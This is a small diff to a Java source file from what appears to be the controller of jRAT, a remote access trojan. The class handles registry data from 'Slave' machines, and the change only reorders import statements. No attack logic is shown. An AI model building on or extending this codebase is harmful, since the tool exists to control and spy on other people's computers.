@@ -1,14 +1,11 @@
 package io.jrat.controller.packets.incoming;
 
-import io.jrat.controller.Slave;
-import io.jrat.controller.ui.frames.FrameRemoteRegistry;
-
-import java.io.DataInputStream;
-
-import javax.swing.ImageIcon;
-
 import com.redpois0n.pathtree.FolderTreeNode;
 import com.redpois0n.pathtree.PathTreeNode;
+import io.jrat.controller.Slave;
+import io.jrat.controller.ui.frames.FrameRemoteRegistry;
+import java.io.DataInputStream;
+import javax.swing.ImageIcon;
 
 public class Packet54Registry extends AbstractIncomingPacket {
 
